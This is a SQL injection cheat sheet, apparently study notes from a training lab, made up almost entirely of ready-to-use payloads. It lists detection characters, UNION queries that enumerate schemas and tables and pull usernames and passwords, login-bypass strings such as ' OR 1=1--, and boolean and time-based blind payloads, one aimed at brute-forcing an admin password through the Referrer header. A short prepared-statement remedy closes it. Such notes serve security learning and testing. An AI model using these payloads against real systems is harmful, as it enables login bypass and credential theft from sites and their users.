-- 1. DETECTION
-- Used to break the query syntax and confirm the vulnerability
'
"
'--
' #

-- 2. IN-BAND SQLi (Union-Based)
-- Step 1: Identifying the number of columns (increment until the error disappears)
' UNION SELECT 1,2,3-- 

-- Step 2: Fingerprinting (Discovering Database name and Version)
0 UNION SELECT 1, 2, database()-- 
0 UNION SELECT 1, 2, @@version-- 

-- Step 3: Enumerating tables from the 'sqli_one' schema
' UNION SELECT 1, 2, group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'-- 

-- Step 4: Enumerating columns from the 'staff_users' table
' UNION SELECT 1, 2, group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'-- 

-- Step 5: Extracting sensitive data (username and password)
' UNION SELECT 1, username, password FROM staff_users-- 

-- 3. BLIND SQLi (Authentication Bypass)
-- Classic payloads to bypass login forms
' OR 1=1;--
' OR 1=1 LIMIT 1;--
" OR 1=1--
admin'--

-- 4. BLIND SQLi (Boolean-Based)
-- Testing if the first character of the admin password is 'a'
' UNION SELECT 1,2,3 FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a'--

-- 5. BLIND SQLi (Time-Based)
-- If the command is executed, the server response will be delayed by 5 seconds
' OR SLEEP(5)--
' UNION SELECT SLEEP(5),2,3--

-- Brute-forcing the password using Time-Based logic (Example)
-- Payload for Referrer header: x' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a WHERE username='admin' AND password LIKE '4%')--

-- 6. REMEDIATION (Prevention)
-- Example of a Secure Prepared Statement (PHP PDO)
-- This is the professional way to handle queries:
-- $stmt = $pdo->prepare('SELECT * FROM users WHERE username = :user');
-- $stmt->execute(['user' => $user_input]);